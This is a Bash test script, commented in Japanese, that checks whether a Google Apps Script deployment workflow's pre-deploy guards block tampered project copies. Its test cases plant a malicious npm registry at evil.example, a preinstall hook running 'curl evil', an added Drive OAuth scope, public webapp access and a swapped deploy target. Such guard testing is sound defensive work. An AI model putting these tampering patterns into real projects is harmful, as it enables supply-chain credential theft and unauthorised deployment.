#!/bin/bash
# GAS反映ワークフローの「反映前の検査」が本当に止めるかを確かめる。
#
#   検査は書いた時点では必ず通る。危ういのは、あとで検査を触ったときに
#   黙って何も見なくなることである。だから「壊したら止まる」を固定する。
#
#   ワークフロー本体（draft/gas-deploy.yml）から run: を取り出して実行するので、
#   ワークフローを変えるとこのテストも自動的に新しい内容を試す。
#
#   使い方: bash ops/workflows/test-gas-deploy-guards.sh
#   ※ clasp も認証も要らない。ネットワークにも出ない（検査1〜5だけを見る）。
set -u
cd "$(dirname "$0")/../.."          # リポジトリの根
WF=ops/workflows/draft/gas-deploy.yml
SCRIPT_ID_EXPECTED=1iQyWD9ysH2zrdc6wn5j9wHUV_busRmZWOHFhigNNI9bIFuoGL9Cu3kab
export SCRIPT_ID="$SCRIPT_ID_EXPECTED"

TMP="${TMPDIR:-/tmp}/gas-deploy-guard-test.$$"
mkdir -p "$TMP"
trap 'rm -rf "$TMP"' EXIT

# ── ワークフローから run: を取り出す（番号は steps の並び順）──
ruby -E UTF-8 -ryaml -e '
  d = YAML.load_file(ARGV[0])
  d["jobs"]["deploy"]["steps"].each_with_index do |s, i|
    next unless s["run"]
    File.write("#{ARGV[1]}/s#{i}.sh", s["run"])
    File.write("#{ARGV[1]}/s#{i}.wd", s["working-directory"] || ".")
  end
' "$WF" "$TMP" || { echo "❌ ワークフローを読めませんでした（YAMLが壊れている可能性）"; exit 1; }

ls "$TMP"/s*.sh >/dev/null 2>&1 || { echo "❌ 検査ステップが1つも取り出せませんでした"; exit 1; }

pass=0; fail=0
# 作業用のコピー（本物の gas/ は触らない）
P="$TMP/work"; mkdir -p "$P"; cp -R gas "$P/gas"

run_step() { # ステップ番号 → 終了コード
  local n="$1" wd
  wd="$(cat "$TMP/s$n.wd")"
  ( cd "$P/$wd" 2>/dev/null || cd "$P" ; bash "$TMP/s$n.sh" ) >/dev/null 2>&1
}

expect_pass() { # 名前 ステップ
  if run_step "$2"; then echo "✓ 通る: $1"; pass=$((pass+1))
  else echo "❌ 通らない（誤検知）: $1"; fail=$((fail+1)); fi
}
expect_fail() { # 名前 ステップ
  if run_step "$2"; then echo "❌ 止まらない（検知漏れ）: $1"; fail=$((fail+1))
  else echo "✓ 止める: $1"; pass=$((pass+1)); fi
}
restore() { rm -rf "$P/gas"; cp -R gas "$P/gas"; }

# ── まず、そのままなら全部通ること（誤検知がないこと）──
echo "== いまの内容では通る =="
for n in 1 2 3 4 5; do expect_pass "検査$n" "$n"; done

# ── 壊したら止まること ──
echo
echo "== 壊したら止まる =="

# 1. npm の仕掛け（認証情報の持ち出し経路）
echo 'registry=https://evil.example/' > "$P/gas/.npmrc"
expect_fail "gas/.npmrc の設置" 1; restore
printf '{"scripts":{"preinstall":"curl evil"}}' > "$P/gas/package.json"
expect_fail "gas/package.json の設置" 1; restore
mkdir -p "$P/gas/node_modules"
expect_fail "gas/node_modules の持ち込み" 1; restore
printf '**/**\n' > "$P/gas/.claspignore"
expect_fail ".claspignore の設置" 1; restore

# 2. 押し出す対象の増減
echo 'function evil(){}' > "$P/gas/Evil.js"
expect_fail "知らない .js の追加" 2; restore
echo '<script>evil()</script>' > "$P/gas/Evil.html"
expect_fail "知らない .html の追加" 2; restore
mkdir -p "$P/gas/sub"; echo 'function evil(){}' > "$P/gas/sub/Evil.js"
expect_fail "下の階層への .js の追加" 2; restore
rm "$P/gas/MealAi.js"
expect_fail "必要な .js の欠落" 2; restore

# 3. 構文
echo 'function broken( {' >> "$P/gas/EdgeJob.js"
expect_fail "構文エラー" 3; restore

# 4. 権限設定
ruby -E UTF-8 -rjson -e '
  p = ARGV[0]; m = JSON.parse(File.read(p))
  m["oauthScopes"] << "https://www.googleapis.com/auth/drive"
  File.write(p, JSON.pretty_generate(m))
' "$P/gas/appsscript.json"
expect_fail "権限スコープの追加（drive）" 4; restore
ruby -E UTF-8 -rjson -e '
  p = ARGV[0]; m = JSON.parse(File.read(p))
  m["webapp"]["access"] = "ANYONE"
  File.write(p, JSON.pretty_generate(m))
' "$P/gas/appsscript.json"
expect_fail "公開範囲の変更" 4; restore
ruby -E UTF-8 -rjson -e '
  p = ARGV[0]; m = JSON.parse(File.read(p))
  m["executionApi"] = { "access" => "ANYONE" }
  File.write(p, JSON.pretty_generate(m))
' "$P/gas/appsscript.json"
expect_fail "見ていないキーの追加（executionApi）" 4; restore
ruby -E UTF-8 -rjson -e '
  p = ARGV[0]; m = JSON.parse(File.read(p))
  m["oauthScopes"].delete("https://www.googleapis.com/auth/gmail.send")
  File.write(p, JSON.pretty_generate(m))
' "$P/gas/appsscript.json"
expect_fail "権限スコープの削除" 4; restore

# 5. clasp の設定
printf '{"scriptId":"%s","rootDir":".."}' "$SCRIPT_ID_EXPECTED" > "$P/gas/.clasp.json"
expect_fail "rootDir のすり替え" 5; restore
printf '{"scriptId":"BOGUS","rootDir":"."}' > "$P/gas/.clasp.json"
expect_fail "反映先のすり替え" 5; restore
printf '{"scriptId":"%s","rootDir":".","filePushOrder":["Evil.js"]}' "$SCRIPT_ID_EXPECTED" > "$P/gas/.clasp.json"
expect_fail "clasp設定へのキー追加" 5; restore

echo
echo "結果: $pass 合格 / $fail 失敗"
[ "$fail" = 0 ] && echo "✅ 検査は生きている" || echo "⚠️  検査に穴がある。反映を有効にしないこと。"
exit $((fail ? 1 : 0))
